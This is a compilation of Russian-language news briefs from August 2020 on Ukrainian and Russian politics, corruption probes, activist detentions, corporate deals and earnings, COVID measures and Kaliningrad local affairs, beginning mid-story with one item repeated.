На четвертом месте "Слуга народа", которая заплатил за рекламу более 15 тысяч долларов (11 страниц). Партия "Голос" потратила 7,2 тысячи долларов и оказалась на пятом месте.
Напомним, ранее сообщалось, что народный депутат от "Слуги народа" Николай Тищенко в июле потратил на политическую рекламу $15,3 тысячи.
 
Источники

Антимонопольный комитет в ходе заседания 20 августа рассмотрит вопрос о приобретении пакета акций АО Волыньоблэнерго компанией АО ЗНВКИФ «Оникс» Анатолия Бойко.
Об этом говорится в повестке дня заседания АМКУ , пишет RegioNews со ссылкой на НВ.
В результате сделки компания Оникс получит контроль более чем над 50 % акций Волыньоблэнерго. Материалы по делу имеют статус «с ограниченным доступом».
По данным портала ring.org.ua , учредителем и руководителем АО ЗНВКИФ «Оникс» является Анатолий Юрьевич Бойко — сын народного депутата и руководителя фракции ОПЗЖ в Верховной Раде Юрия Бойко.
Напомним, 17 августа Илья Кива подарил Вадиму Рабиновичу его портрет на фоне Шевченко, Наполеона и Николая II.
 
Источники

В Херсоне, накануне приезда президента Владимира Зеленского, рабочие ночью укатывали новый асфальт на площадку, где он должен вручить семь новых машин почтальонам.
Соответствующие видео опубликовали на сайте местного издания «Мост», передает RegioNews.
Дорожные работы велись на парковке возле здания «Укрпочты» на Бериславском шоссе, где «20 августа, Зеленский торжественно будет вручать семь машин почтальонам».
Отмечается, что работы начались в районе 22:00 и закончились за пару часов.
На видео (1, 2) видно, как техника укатывает в ночное время асфальтом площадку.
Ранее сообщалось, что президент Украины Владимир Зеленский прибыл с рабочей поездкой в ​​Херсонскую область.
Напомним, что в Хмельницкой области готовиться к приезду Владимира Зеленского начали за несколько дней. Центральную улицу села ремонтировали даже под проливным дождем.
 
Источники

В среду, 19 августа, крупнейший в США производитель косметических товаров Johnson & Johnson заключил соглашение о приобретении фармацевтической&nbsp;компании Momenta Pharmaceuticals за $6,5 млрд.
Сообщается, что J&J намерена заплатить за каждую акцию Momenta $52,5, что на 70% выше их цены закрытия во вторник, 18 августа.
J&J рассчитывает, что сделка позволит усилить позиции ее подразделения Janssen Pharmaceutical в разработке препаратов для лечения аутоиммунных заболеваний, на которых специализируется Momenta. При этом J&J также получит доступ к экспериментальному препарату от гемолитической болезни новорожденных nipocalimab.
 
Источники

В Санкт-Петербурге задержали участника «Альянса врачей» Алексея Абзианидзе, который пришел в прокуратуру для ознакомления с документами по своей жалобе. Об этом ОВД-Инфо сообщил его знакомый Эдуард Шитик.
Абзианидзе задержали в здании прокуратуры Санкт-Петербурга под предлогом того, что он находился без маски. Шитик сообщает, что Абзианидзе был в маске.
Абзианидзе проводит расследования по фальсификациям в области медицины, в связи с чем приехал в прокуратуру города для ознакомления с документами по своему заявлению и чтобы попасть на прием к прокурору.
С ОВД-Инфо связался сам Абзианидзе и рассказал, что его доставили в 1-й отдел полиции. Сотрудников правоохранительных органов вызвал дежурный прокурор, когда увидел, что Абзианидзе ведет видеосъемку. В полиции ему объявили, что вменяют статью о хулиганстве (ст. 20.1 КоАП).
Новость обновляетсяИсправлена неточность в указании места задержания
 
Источники

АвтоВАЗ объявил конкурс на название для новой модели LADA, говорится на странице автопроизводителя "ВКонтакте". Конкурс продлится до 31 августа.
В сообщении указаны требования, которые предъявляются к названию: оно должно&nbsp;ассоциироваться с Россией; хорошо сочетаться со словом LADA;&nbsp;иметь 2-3 слога и оканчиваться на букву "А";&nbsp;иметь понятное ударение, постановка которого не вызывает затруднений;&nbsp;легко и однозначно читаться, запоминаться как на кириллице, так и на латинице;&nbsp;иметь благозвучное звучание.
 
Источники

В Калининградской области медикам предлагают зарплату на семь тысяч рублей  меньше, чем в среднем по России. Об этом сообщают аналитики hh.
Специалисты изучили более 650 тысяч вакансий в сфере медицины и фармацевтики, открытых с января 2019 года по июль 2020-го. В целом по России средние зарплаты, по последним данным, равнялись 43 945 рублей, в Калининградской области — 36 796 рублей. Разница между нашим регионом и Москвой составила более 25 тысяч рублей — в столице медикам готовы платить 62 357 рублей.
 
Источники

Депутат Никопольского районного совета Днепропетровской области был задержан при получении взятки.
Об этом сообщает военная прокуратура Южного региона, передает RegioNews.
По данным следствия, депутат от ВО "Батькивщина" и одновременно заместитель начальника Никопольского управления защитных массивов днепровских водохранилищ был задержан при получении взятки в 48 тыс. гривен.
В целом депутат требовал 100 тысяч гривен за принятие решения о предоставлении в аренду складов, принадлежащих Управлению.
Он также должен был составить и подписать договор аренды имущества коммерческой фирме.
Возбуждено уголовное дело по факту принятия предложения, обещания или получения неправомерной выгоды должностным лицом.
Напомним, в Днепре директора метрополитена подозревают в махинациях на 240 млн грн. Чиновника подозревают в служебной халатности, дело расследует СБУ.
 
Источники

Украина передала в концессию на 35 лет морской порт «Ольвия» в Николаеве фирме из Катара «QTerminals».
Об этом на своей странице в Facebook написал министр инфраструктуры Украины Владислав Криклий, передает Regionews.
 
Концессионер проекта – мощная катарская компания QTerminals, которая управляет крупнейшим торговым портом Катара - Хамад стоимостью свыше $7 млрд, инвестирует в развитие порта на первом этапе около 3,4 млрд грн.
Всего за 35 лет концессии будет привлечено до 17,3 млрд грн инвестиций. Это первая прямая катарская инвестиция, вторая по объему инвестиция после "Криворожстали” и одна из крупнейших прямых иностранных инвестиций в портовую отрасль Украины за всю историю независимости.
 
Напомним, ранее сообщалось, что Николаевский порт "Ольвия" сдадут в концессию до конца августа.
 
Источники

Национальное агентство по вопросам предотвращения коррупции начало проверку деклараций еще 31 чиновника, среди которых министр защиты окружающей среды и природных ресурсов Роман Абрамовский и народный депутат Николай Тищенко.
Как пишет RegioNews, об этом сообщили в пресс-службе НАПК.
Отмечается, что декларации для проверки были определены новым Порядком проведения контроля.
 
Также указаны фамилии должностных лиц: 
Юлия Свириденко, первый заместитель министра развития экономики, торговли и сельского хозяйства;
 
Игорь Дядюра, заместитель министра развития экономики, торговли и сельского хозяйства;
 
Дмитрий Романович, заместитель министра развития экономики, торговли и сельского хозяйства;
 
Василий Шкураков, заместитель министра финансов;
 
Ольга Онищук, заместитель министра юстиции по вопросам государственной регистрации;
 
Александр Шелест, заместитель министра цифровой трансформации;
 
Наталья Форсюк, заместитель министра инфраструктуры;
 
Олег Ющенко, заместитель министра инфраструктуры;
 
Александр Полищук, заместитель министра обороны;
 
Антон Геращенко, заместитель министра внутренних дел;
 
Сергей Гончаров, заместитель министра внутренних дел;
 
Георгий Тука, бывший заместитель министра по вопросам временно оккупированных территорий и внутренне перемещенных лиц;
 
Александра Чуркина, бывший заместитель министра социальной политики по вопросам европейской интеграции;
 
Наталья Федорович, бывший заместитель министра социальной политики;
 
Алина Фролова, бывший заместитель министра обороны;
 
Денис Чернышов, бывший заместитель министра юстиции;
 
Максим Ярмистый, бывший заместитель министра образования и науки.
Также указано, что к проверке взято декларации таких лиц: 
Николай Тищенко, народный депутат Украины;
 
Игорь Мирошниченко, депутат Киевского городского совета;
 
Леонид Личман, Председатель Малиновского районного суда. Одессы;
 
Сергей Водько, заместитель начальника отдела внутренней безопасности ГУ Государственной фискальной службы в Ровенской области;
 
Валентин Хаджи, депутат Килийского городского совета;
 
Максим Меркулов, старший государственный инспектор отдела государственного контроля и надзора за безопасностью на транспорте в Киевской области, Киевское межрегиональное управление Укртрансбезпеки;
 
Павел Прищепа, депутат Компанеевского поселкового совета;
 
Станислав Улизько, депутат Подольского районного совета в г. Полтава;
 
Оксана Сидоренко, управляющий исполнительным аппаратом Чаплинской районной совета Херсонской области;
 
Евгений Селезнев, заместитель начальника управления — начальник отдела ОРтН в Одесской области управления ДКВС Украины Южного межрегионального управления по вопросам исполнения уголовных наказаний Министерства юстиции;
 
Виктория Колодий, старший государственный инспектор Южного управления в г. Одессе ГУ Государственной налоговой службы в Одесской области;
 
Алексей Новак, депутат Белозерской районной совета Херсонской области;
 
Лилия Волчанска, главный государственный инспектор Галицкой таможни Государственной таможенной службы.
 
Во время проверки НАПК, как отмечается, выяснит достоверность задекларированных сведений, точность оценки задекларированных активов, а также проверит указанных лиц на наличие конфликта интересов.
На проведение полной проверки декларации предусмотрено до 120 календарных дней. При наличии оснований проверка может быть продлен, но не более чем на 60 календарных дней.
Ранее стало известно об учреждениях, которые игнорируют подачу деклараций.
 
Источники

В заведение под предлогом реабилитации помещали лиц с нарко - и алкозависимостью, которых принудительно удерживали и «лечили» за деньги, полученные от родственников.
Об этом пишет RegioNews со ссылкой на ГУ Нацполиции Львовской области.
 
Руководителями "реабилитационного центра" оказались 40-летний житель города Львова, который непосредственно осуществлял руководство над персоналом, и 43-летняя женщина, которая проживала в заведении и общалась с родственниками нарко - и алкозависимых с целью получения от них денег.
Руководители заведения не имели никаких разрешительных документов на занятие такой деятельностью и вообще не имеют отношения к медицинской сферы.
Следователи провели обыски в одном из "реабилитационных центров", расположенном в частном доме в одном из сел Жовковского района. Правоохранители изъяли документацию на лиц, которые проходили "реабилитацию", деньги, компьютерную технику, а также другие вещественные доказательства противоправной деятельности..
По факту следователи открыли уголовное производство по ч. 2 ст.149 (Торговля людьми) Уголовного кодекса Украины. Санкция статьи предусматривает наказание - лишение свободы на срок от пяти до двенадцати лет с конфискацией имущества или без таковой.
Полиция устанавливает всех лиц, причастных к указанной незаконной деятельности. Досудебное расследование продолжается.
 
Напомним, 17 августа в Харькове разоблачена деятельность псевдореабілітаційного центра, где насильно удерживали людей.
 
Источники

ВКонтакте работает над искусственным интеллектом (ИИ) для автоматического распознавания материалов с хейтспичем — враждебными высказываниями. Об этом сообщает пресс-служба социальной сети. «Технология призвана ускорить время обработки жалоб и помочь пользователям реже сталкиваться с проявлениями нетерпимости», — также отмечает интернет-сервис.
Нейросеть учится определять самые разные категории оскорблений и угроз. Среди них — проявления ксенофобии, расизма, гомофобии, сексизма и других предрассудков, а также оскорбления на почве религиозной принадлежности, возраста, внешности или наличия заболеваний. Чтобы усилить модерацию, «ВКонтакте» добавила новую категорию жалоб — «Враждебные высказывания». Эта категория поможет в обучении нейросети, а пока модерацией занимаются сотрудники компании.
«Мы разделяем позицию наших пользователей и партнёров касательно языка вражды и прославления насилия. Модераторы „ВКонтакте“ ежедневно обрабатывают огромный объём контента, в том числе с использованием искусственного интеллекта — большинство опасных материалов удаляются ещё до того, как их кто-то увидит. Если же вы заметили оскорбительную публикацию, пожалуйтесь на неё. С проявлениями нетерпимости эффективнее бороться вместе — и мы призываем пользователей присоединяться к нам в этой борьбе», — объясняет руководитель команды модерации «ВКонтакте» Иван Корнеев.
За первую половину 2020 года на платформе было удалено 520 тысяч единиц контента по теме разжигания вражды и ненависти, а также заблокировано 1340 профилей и 2470 сообществ, распространяющих враждебные высказывания.
 
Источники

"Сбербанк" закрыл сделку об инвестициях в развитие и приобретении контрольной доли в 2ГИС, российской компании в сфере разработки цифровых карт и справочников городов, говорится в сообщении банка.
По итогам сделки доля "Сбербанка" составила 72%, доля совместного предприятия "Сбербанка" и Mail.ru Group в сфере транспорта и еды - 3%. Основатели и менеджмент сохранили за собой долю 25% в компании. Инвестиционные фонды Baring Vostok и RTP Global полностью вышли из капитала 2ГИС.
"Сбербанк" и 2ГИС утвердили дорожную карту на два года по совместным проектам, цель которых - развитие технологической платформы, продуктов и сервисов, которые делают жизнь пользователей удобнее и помогают предпринимателям вести бизнес. 2ГИС начал взаимодействовать с компаниями экосистемы банка и совместного с Mail.ru Group O2O-предприятия, среди первых интеграций -&nbsp; появление в геосервисе возможности узнать стоимость проезда и заказать такси "Ситимобил" и доставку Delivery Club.
В числе приоритетных направлений &ndash; развитие картографической платформы, которая поможет совершенствовать сервисы экосистемы и создавать новые продукты; запуск новых возможностей в геосервисе 2ГИС, в том числе, маркетплейса; создание инструментов для разработчиков, которые позволят использовать данные и картографию 2ГИС в других мобильных приложениях и сервисах.
"2ГИС &ndash; это уникальный актив, картографический сервис мирового уровня, который создает для миллионов людей новый уровень комфорта и новые возможности, делая их жизнь удобной и сохраняя самый важный ресурс &ndash; время. 2ГИС помогает выбрать оптимальный способ добраться в нужную точку, обеспечивает мгновенный доступ к офлайн-услугам, но это лишь верхушка айсберга. "Под капотом" у сервиса &ndash; мощнейший и многофункциональный движок, который в перспективе будет закрывать множество жизненно важных потребностей наших частных и корпоративных клиентов с помощью продуктов и услуг компаний нашей экосистемы. Мы рады присоединению профессиональной команды сервиса к нашей экосистеме и уже работаем над новыми проектами", - прокомментировал первый зампред правления "Сбербанка" Лев Хасис.
 
Источники

NVIDIA (NVDA), крупнейший в мире производитель графических ускорителей, представил сильную отчетность за 2-й квартал 2021 фингода, завершившийся 26 июля. Выручка увеличилась на 49,9% г/г до рекордных $3,87 млрд на фоне резкого роста популярности онлайн-игр и сервисов для дистанционной работы в условиях пандемии Covid-19 и превзошла консенсус-прогноз на уровне $3,65 млрд. Продажи в сегменте игровых GPU выросли на 26% до $1,65 млрд, поскольку люди стали больше играть в компьютерные игры из-за необходимости больше&nbsp;оставаться дома на фоне распространения коронавируса. При этом продажи в сегменте решений для центров обработки данных взлетели на 167% до рекордных $1,75 млрд на фоне сильного спроса со стороны провайдеров гипермасштабируемых облачных сервисов, которые используют процессоры компании для своих датацентров. При этом на фирму Mellanox, сделку по поглощению которой NVIDIA закрыла в апреле, пришлось 30% выручки в данном сегменте. Отметим также, что&nbsp;доходы в сегменте датацентров впервые превысили доходы игрового сегмента. Между тем продажи в сегменте решений для графических станций сократились на 30,2% до $203 млрд, а в сегменте решений для автомобильной отрасли падение выручки составило&nbsp; 46,9% &ndash; до $111 млн. Скорректированный показатель EBITDA подскочил на 114,8% до $1,92 млрд, а скорректированная прибыль на акцию выросла на 75,8% до $2,18 и уверенно опередила среднюю оценку аналитиков Уолл-стрит на уровне $1,97.
NVIDIA завершила 2-й финквартал, имея на счетах $10,98 млрд денежных средств и краткосрочных инвестиций. Общий долг составил $7,57 млрд. В отчетном периоде компания сгенерировала операционный денежный поток в объеме $1,57 млрд (рост на 67,3% г/г) и направила $217 млн на капвложения и $99 млн на выплату дивидендов. Ранее руководство NVIDIA отмечало, что рассматривает возможность возобновления реализации программы выкупа акций в зависимости от рыночных условий. Одобренный объем программы buyback составляет $7,24 млрд в период до декабря 2022 г.
NVIDIA обнародовала весьма оптимистичные прогнозы на 3-финквартал с окончанием в октябре и ожидает выручку на уровне $4,40 млрд плюс/минус 2%, тогда как консенсус-прогноз для данного показателя составляет $3,97 млрд. "Внедрение вычислительных решений NVIDIA ускоряется, обеспечивая рекордный объем поступлений и исключительный рост", &ndash; заявил глава компании Дженсен Хуан.
 
Источники

Территорию так называемого Суздальского леса — зелёную зону в границах улиц Стрелецкой и Суздальской — следует развивать и приводить в порядок. Такое мнение губернатор Антон Алиханов высказал во время рабочего выезда в среду, 19 августа.
Эта территория требует развития, и это не лес. К сожалению, город есть город", — заявил Алиханов, акцентировав внимание на том, что бывшие парки следует оградить от потенциальной застройки и "наделять их другими статусами, которые будет практически невозможно снять".
По словам главы региона, участок выкуплен на торгах.
Мы встречались и встречаемся, работаем с группой жителей, которые живут рядом. Проект, который реализуется, предусматривает сохранение аллеи, высадку новых аллей, создание нормальной территории. Сейчас это просто бурьян", — отметил губернатор.
Участок в границах Стрелецкой и Суздальской планируют перевести в общественно-жилую зону, что позволит застроить территорию. Поручение о новом охранном статусе для парков и скверов губернатор дал на экологическом совете при правительстве области.
 
Источники

В Гурьевске пошёл под суд начальник управления дорожного хозяйства и благоустройства местной администрации, которого обвиняют в гибели 12-летней школьницы под упавшим деревом. Об этом сообщает региональный СКР.
Новость дополняется.
12 марта около 15:00 в Гурьевске на Калининградском шоссе на девочку упало дерево, она погибла. Школьница училась в шестом классе.
 
Источники

Президент Владимир Зеленский использует служебные поездки в регионы Украины для агитации за политическую партию «Слуга народа».
Об этом в Facebook сообщает Комитет избирателей Украины, передает RegioNews.
По данным комитета, Зеленский фактически проводит скрытую политическую агитацию во время поездок в областные центры, в частности в Запорожье и Херсон.
По оценке КИУ, такие действия президента, как выступления на сцене, где представлены агитационные материалы партии «Слуга народа», представление кандидатов на местных выборах и акцент во время выступлений на предвыборном лозунге этой партии является проявлением использования служебных полномочий в политических целях, а также имеет признаки политической коррупции и злоупотребления админресурсом.
 
Активисты отмечают, что в среднем один региональный перелет президента стоит около 250 тыс. грн, а всего с начала августа Государственное управление делами перечислило авиакомпании «Украина» более чем 1 млн грн за перелеты Зеленского.
В этой сумме не учтены средства, которые государство тратит на охрану и безопасность первых лиц.
Напомним, СМИ писали, что Владимир Зеленский в конце августа отправится в предвыборный тур по Украине. Он будет представлять кандидатов от «Слуг народа» в крупных городах.
20 августа Зеленский представил кандидата на пост мэра Херсона, им стал Юрий Кириллов.
 
Источники

В атмосферном воздухе столицы в последние дни повысилось содержание продуктов горения: формальдегида, диоксида азота и диоксида серы.
Как передает RegioNews, об этом сообщает пресс-служба КГГА.
 
В воздухе Киева зафиксировано превышение:
 
диоксида серы на площадях Бессарабской, Демеевской, бульваре Леси Украинки, проспекте Науки.
 
диоксида азота на площадях Бессарабской и Демеевской, Оболонском проспекте, бульваре Леси Украинки.
 
формальдегида - на площадях Бессарабской и Демеевской, Оболонском проспекте, бульваре Леси Украинки.
Также в столице наблюдается высокий уровень пожарной опасности, и все чаще возникают пожары в экосистемах. Связано это с высокой температурой в приземном слое воздуха и началом сжигания сухой растительности населением.
За последние сутки в экосистемах Киева зафиксировано пять очагов пожаров травяного настила общей площадью 5,167 га. Все они ликвидированы. В Киевской области за последние сутки ликвидировано 42 очага пожаров травяного настила площадью 45 га. Ликвидировано три очага пожаров торфа площадью 0,5 га.
Напомним, вблизи Сум произошел выброс токсичного одоранта, что имеет неприятный сильный запах. Местные власти призвали людей закрыть окна и увлажнять воздух в помещении.
 
Источники

Дело о восстановлении в должности городского головы Черновцов Алексея Каспрук рассмотрят 7 сентября в Хмельницком окружном административном суде.
Об этом говорится в Едином государственном реестре судебных решений, пишет RegioNews.
Алексей Каспрук, как истец, потребует признать противоправным предварительное решение по устранению, а также будет добиваться возобновления и взыскании среднего заработка за время вынужденного прогула.
Председательствующим судьей будет Иван Тарновецкий. Подготовительное заседание состоится 7 сентября, в 10:00.
Напомним, 17 июля Верховный суд отстранил Алексея Каспрука с должности мэра Черновцов.
 
Источники

В Москве задержали трех активистов проекта «Декоммунизация». Они собирались провести акцию в Новоарбатском тоннеле в память о жертвах августовского путча 1991 года. Об этом ОВД-Инфо сообщил один из задержанных, Дмитрий Энтео.
Дмитрия Энтео, Михаила Шнейдера и Вадима Громова доставили в ОВД по району «Арбат».
 
Источники

В среду, 19 августа, американская онлайн-площадка для аренды частного жилья Airbnb подала конфиденциальную заявку в Комиссию по ценным бумагам и биржам США на проведение первичного публичного размещения своих акций.
Стоит отметить, что решение провести IPO является крайне неожиданным в данный момент, так как бизнес компании существенно пострадал в связи с пандемией коронавируса. Так, выручка Airbnb за три месяца с окончанием 30 июня уменьшилась на 67% г/г до $335 млн, при этом убыток до уплаты процентов, налогов и амортизации составил $400 млн.
В то же время ситуация с бронированиями улучшилась ближе к концу второго квартала - количество бронирований жилья через сервис снизилось на 30% в июне по сравнению с падением на 70% в мае.
Между тем, помимо Airbnb, главными претендентами на проведение IPO в текущем году являются Palantir Technologies и DoorDash.
 
Источники

В районе пос. Кумачёво легковушка столкнулась с бронетранспортёром. Об этом сообщает пресс-служба регионального УМВД.
ДТП произошло в четверг, 20 августа, около 13:00. По предварительным данным никто не пострадал. На месте работает ГИБДД.
Как сообщил "Клопс" источник, колонна Балтфлота двигалась в сопровождении автомобиля Военной автомобильной инспекции (ВАИ), соблюдая все правила. По предварительным данным, сидевшая за рулём легковушки женщина пыталась обогнать военных. Автомобилистка пересекла сплошную и задела бронетранспортёр.
 
Источники

Нижегородский районный суд на пять суток арестовали гражданского активиста Максима Алибаева, задержанного за одиночный пикет в поддержку незарегистрированного кандидата в Госдуму. Первые трое суток он уже отсидел месяц назад. Об этом ОВД-Инфо сообщил председатель нижегородского «Мемориала» Аркадий Галкер.
Свой пикет против недопуска кандидата от «Яблока» Алексея Садомовского на выборах в городскую думу Алибаев провел 26 июля. К нему подошли полицейские и потребовали предъявить паспорт, а после его отказа задержали.
На следующий день суд признал его виновным в неповиновении сотрудникам полиции (ст. 19.3 КоАП) и арестовал на трое суток. Через некоторое время Нижегородский областной суд отменил это решение и оправил дело на новое рассмотрение. Поводом стало то, что Алибаев является членом УИК с правом решающего голоса, и привлечение его к административной ответственности возможно только по санкции прокурора.
 
Источники

В Харькове активисты зафиксировали массовое размещение внешней рекламы партии действующего мэра города "Блок Кернеса-Успешный Харьков".
Об этом сообщает гражданская сеть " Опора", передает RegioNews.
По данным активистов, изображения Кернеса есть не только на билбордах и ситилайтах. Многочисленная реклама его партии размещена в общественном транспорте, на территории пригородных автобусных терминалов, в парках и скверах.
Также рекламными плакатами политической силы Кернеса завешаны подъезды многоэтажек.
 
На билбордах "Слуги народа" фиксировали изображение головы Харьковской ОГА Алексея Кучера, его первого заместителя Татьяны Егоровой-Луценко, депутата Верховной Рады Павла Сушко, мэра Изюма Владимира Марченко, Люботинського городского головы Леонида Лазуренко.
На территории области фиксировали борды с изображением народного депутата Украины Юлии Светличной с лозунгом: "Достойное завтра" и ее именной региональной партии "Блок Юлии Светличной" Вместе ".
Также в области заметили политические билборды партий "Победа Пальчевского", "За будущее", "Новые лица", "Европейская Солидарность" и "Национальный корпус".
Напомним, Кучер назначил нового руководителя штаба по противодействию COVID-19. Во время брифинга Татьяна Егорова-Луценко сообщила о планах работы на ближайший период.
 
Источники

Министерство инфраструктуры Украины планирует передать в концессию паромную переправу в порт Черноморск
Об этом на своей странице в Facebook написал министр инфраструктуры Украины Владислав Криклий, передает Regionews.
 
Министр добавил, что уже начат конкурсный отбор консультантов проекта для написания технико-экономического обоснования и тендерной документации.
 
Напомним, сегодня Украина передала в концессию порт "Ольвия" в Николаеве.
 
Источники

Территорию так называемого Суздальского леса — зелёную зону в границах улиц Стрелецкой и Суздальской — следует развивать и приводить в порядок. Такое мнение губернатор Антон Алиханов высказал во время рабочего выезда в среду, 19 августа.
Эта территория требует развития, и это не лес. К сожалению, город есть город", — заявил Алиханов, акцентировав внимание на том, что бывшие парки следует оградить от потенциальной застройки и "наделять их другими статусами, которые будет практически невозможно снять".
По словам главы региона, участок выкуплен на торгах.
Мы встречались и встречаемся, работаем с группой жителей, которые живут рядом. Проект, который реализуется, предусматривает сохранение аллеи, высадку новых аллей, создание нормальной территории. Сейчас это просто бурьян", — отметил губернатор.
Участок в границах Стрелецкой и Суздальской планируют перевести в общественно-жилую зону, что позволит застроить территорию. Поручение о новом охранном статусе для парков и скверов губернатор дал на экологическом совете при правительстве области.
 
Источники

Министр иностранных дел Мексики Марсело Эбрард в ходе встречи с послом России Виктором Коронелли заявил, что правительство Мексики хочет провести клинические испытания российской вакцины от коронавируса у себя в стране. Об этом сообщил МИД Мексики.
«Канцлер Марсело Эбрард встретился сегодня с послом России Виктором К. Коронелли, чтобы выразить заинтересованность правительства Мексики в проведении клинических испытаний вакцины «Спутник V» против COVID-19 в нашей стране на основе обмена технической информацией между органами здравоохранения», ‒ говорится в сообщении, пишут «Ведомости».
Уточняется, что испытания вакцины могут продлиться около трех месяцев в зависимости от выбранного протокола.
Вакцину от коронавируса, получившую название «Спутник V», зарегистрировали 11 августа. О регистрации сообщил президент РФ Владимир Путин. Ее будут производить Центр им. Гамалеи и компания «Биннофарм», 15 августа стартовало ее производство. Вакцинация будет добровольной. В августе 2020 года может начаться добровольная вакцинация медиков. Известно, что прививку уже сделали губернатор Курской области Роман Старовойт и вице-премьер Марат Хуснуллин.
 
Источники

Препятствий для участия президента Белоруссии Александра Лукашенко в повторных выборах нет. Об этом сообщила член Координационного совета белорусской оппозиции Мария Колесникова.
«Мы видим, что, даже обладая административным ресурсом, даже с грубейшими фальсификациями он проиграл. Мы исходим из того, что каждый гражданин Беларуси должен иметь право на участие в выборах, никаких препятствий здесь быть не должно. Но мы не верим, что Лукашенко на это пойдет», ‒ сказала Колесникова, пишет Tut.by.
По ее словам, полномочия Лукашенко истекают 5 ноября. После этого белорусская оппозиция будет добиваться проведения повторных президентских выборов с привлечением международных наблюдателей. Состав Центральной избирательной комиссии при этом должен полностью обновиться, отметила Колесникова.
По официальным данным ЦИК Белоруссии, на президентских выборах 9 августа победил Александр Лукашенко, набравший 80.1% голосов. Кандидат объединенной оппозиции Светлана Тихановская, по версии ЦИК, стала второй с 10.1% голосов. Все участники выборов, кроме Лукашенко, не признали итоги голосования. С 9 августа в стране проходят массовые протесты против Александра Лукашенко.
 
Источники

В армянской церкви Сурб-Хач (Святого Креста) на острове Ахтамар озера Ван, находящегося на территории Турции, 6 сентября будет отслужена литургия.
Отмечается, что в этом году участие будет ограничено, пишет Ermenihaber.
Богослужение в армянской церкви проводится каждый год во второе воскресенье сентября.
Из Константинопольского патриархата Армянской Апостольской Церкви для проведения литургии прибудут 25 священнослужителей.
Церковь Сурб Хач в Ване – единственная на территории исторической Армении, купол которой увенчан крестом. Церковь была отреставрирована и открыта для посетителей в качестве музея в 2010 году, после 95-летнего перерыва. Церковь известна своими фресками, представляющими сцены из Ветхого и Нового завета, которые сохранились до наших дней. Армянская община после реставрации церкви получила разрешение раз в год проводить здесь церковную службу.
 
Источники

В четверг президент США Дональд Трамп принимает в Белом доме премьер-министра Ирака Мустафу аль-Казыми для переговоров, посвященных проблемам укрепления стабильности и безопасности в Ираке, а также развитию иракской экономики.
«Поскольку мы работаем во имя экономического процветания и свободы от иностранного вмешательства во внутренние дела (Ирака), улучшение отношений с соседями также является критически важной частью обсуждения», – сказал в преддверии встречи высокопоставленный представитель администрации США.
Напомним, что в Ираке находятся приблизительно 5000 американских военных, в задачу которых входит проведение антитеррористических операций и обучение иракских сил безопасности.
По словам представителя администрации, не существует точного расписания дальнейшего сокращения американского военного присутствия в Ираке, однако этот вопрос является частью дискуссии, поскольку идет оценка потребностей Ирака в сфере безопасности и того, что в связи с ними могут сделать США.
Другим предметом обсуждения является, по словам Белого дома, иракский Курдистан. Как отметил собеседник «Голоса Америки», это – «критически важный компонент стабильного, суверенного Ирака».
В среду госсекретарь США Майк Помпео объявил о выделении дополнительной гуманитарной помощи Ираку в размере 204 миллионов долларов. Эти средства призваны помочь иракскому народу, иракским беженцам в регионе и тем общинам, которые их принимают.
Аль-Казыми возглавил иракское правительство в мае нынешнего года – в период, когда американо-иракские отношения приобрели натянутый характер.
 
Источники

Объем международных резервов по состоянию на 14 августа составил $590,2 млрд, сократившисьза неделю на $10,5 млрд. Об этом сообщил Банк России. По состоянию на&nbsp;7 августа международные резервы составили $600,7 млрд.
Международные резервы РФ представляют собой высоколиквидные иностранные активы, имеющиеся в распоряжении Банка России и правительства РФ. Международные резервы состоят из средств в иностранной валюте, специальных прав заимствования (СДР), резервной позиции в МВФ и монетарного золота.
 
Источники

Британский ритейлер товаров для спорта Frasers Group, ранее известный как Sports Direct International, представил финансовые результаты за 2020 фискальный год, завершившийся 26 апреля, в соответствии с которыми прибыль до налогообложения составила 143,5 млн фунтов стерлингов ($187,8 млн) по сравнению с 179,2 млн фунтов стерлингов годом ранее.
Тем временем, выручка компании в отчетном периоде увеличилась с 3,7 млрд фунтов стерлингов годом ранее до 3,96 млрд фунтов стерлингов, однако без учета колебаний валютного курса показатель снизился на 15% г/г.
В то же время совет директоров Frasers Group принял решение не выплачивать промежуточные дивиденды в связи с негативным воздействием пандемии коронавируса на бизнес компании.
 
Источники

В Литве иностранцы, занимающиеся коммерческими перевозками за рубеж, должны соблюдать режим изоляции до момента отъезда из страны даже в случае, если они прибыли на короткий срок. Об этом со ссылкой на министра здравоохранения Аурелиюса Верига сообщает изданиеDelfiв четверг, 20 августа.
До сих пор дальнобойщики могли свободно перемещаться, если они приезжали в Литву на срок менее трёх суток. В минздраве республики указали, что новое правило вводится ради того, чтобы минимизировать риск распространения коронавируса.
В случае если иностранцы остаются в стране на срок свыше 72 часов, они обязаны пройти тест на COVID-19. В силе остаётся также порядок о двухнедельной изоляции для таких приезжих. Издание отмечает, что дальнобойщики и сотрудник транспортных компаний уже стали причиной нескольких вспышек коронавирусной инфекции на территории Литвы.
Литва может повторно закрыть границы на фоне ухудшения ситуации с Covid-19 в Европе. В связи со смягчением противоэпидемических мер в ЕС вновь растёт число заражений коронавирусом. Решение о возврате ограничений страны содружества должны принять сообща.
 
Источники

В Калининграде вырос спрос на покупку жилья среди приезжих: не менее 70% новых собственников квартир — жители "большой" России. Такую цифру называют эксперты, в том числе директор агентства недвижимости "Клипер" Олег Перевалов:
"Идёт геометрическая прогрессия. Один приехал, и другие приехали за ним. Эта тенденция развивается с 90-х годов. В пандемию многие поехали в Калининградскую область пересидеть самоизоляцию в приятном месте, увидели, что тут комфортно, и решили остаться", — добавил эксперт.
Представители отрасли единогласно подтверждают, что рынок недвижимости активизировался за счёт жителей других регионов.
"У нас достаточно много жилья покупают приезжие, город в этом отношении специфический. Сейчас активно поддерживается спрос, в том числе  — за счёт льготной ипотеки", — прокомментировал ситуацию глава агентства недвижимости "Авеню Риэлт" Марат Субхангулов.
Одной из причин возросшего интереса к переезду в Калининград стало развитие внутреннего туризма и повышенный спрос на отдых на побережье Балтийского моря. В разгар сезона многие туристы принимают решение о покупке строящегося или готового жилья.
"Наш рынок связан с туризмом. Зачастую работаем с теми, кто второй раз в Калининграде. Первый раз они бывают здесь как туристы, а потом возвращаются как покупатели", — рассказала гендиректор Союза профессиональных риэлторов Татьяна Гилёва.
